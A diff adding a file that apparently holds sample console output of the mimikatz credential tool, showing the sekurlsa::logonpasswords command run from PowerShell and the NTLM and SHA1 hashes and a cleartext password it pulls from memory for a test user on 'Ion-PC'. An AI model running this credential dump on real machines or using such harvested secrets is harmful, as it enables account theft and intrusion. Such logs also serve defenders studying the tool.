@@ -1,0 +1,135 @@
+
+  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Feb 16 2015 22:17:52)
+ .## ^ ##.  
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  '#####'                                     with 15 modules * * */
+
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 195072 (00000000:0002fa00)
+Session           : Interactive from 1
+User Name         : Ion
+Domain            : Ion-PC
+SID               : S-1-5-21-2367887663-2567669145-1589166190-1000
+	msv :	
+	 [00000003] Primary
+	 * Username : Ion
+	 * Domain   : Ion-PC
+	 * NTLM     : a4a9436b46f7e948b2417435b63d6cac
+	 * SHA1     : 6c69a6cc3e5313a83fde6d27256b17e5020ffcb5
+	 [00010000] CredentialKeys
+	 * NTLM     : a4a9436b46f7e948b2417435b63d6cac
+	 * SHA1     : 6c69a6cc3e5313a83fde6d27256b17e5020ffcb5
+	tspkg :	
+	wdigest :	
+	 * Username : Ion
+	 * Domain   : Ion-PC
+	 * Password : MySecretP4ass
+	kerberos :	
+	 * Username : Ion
+	 * Domain   : Ion-PC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 195024 (00000000:0002f9d0)
+Session           : Interactive from 1
+User Name         : Ion
+Domain            : Ion-PC
+SID               : S-1-5-21-2367887663-2567669145-1589166190-1000
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : a4a9436b46f7e948b2417435b63d6cac
+	 * SHA1     : 6c69a6cc3e5313a83fde6d27256b17e5020ffcb5
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : SUDOTS35
+	 [00000003] Primary
+	 * Username : Ion
+	 * Domain   : Ion-PC
+	 * NTLM     : a4a9436b46f7e948b2417435b63d6cac
+	 * SHA1     : 6c69a6cc3e5313a83fde6d27256b17e5020ffcb5
+	tspkg :	
+	wdigest :	
+	 * Username : Ion
+	 * Domain   : Ion-PC
+	 * Password : MySecretP4ass
+	kerberos :	
+	 * Username : Ion
+	 * Domain   : Ion-PC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : ION-PC$
+Domain            : WORKGROUP
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ION-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ion-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 30678 (00000000:000077d6)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : ION-PC$
+Domain            : WORKGROUP
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : ION-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ion-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(powershell) # exit
+Bye!
+
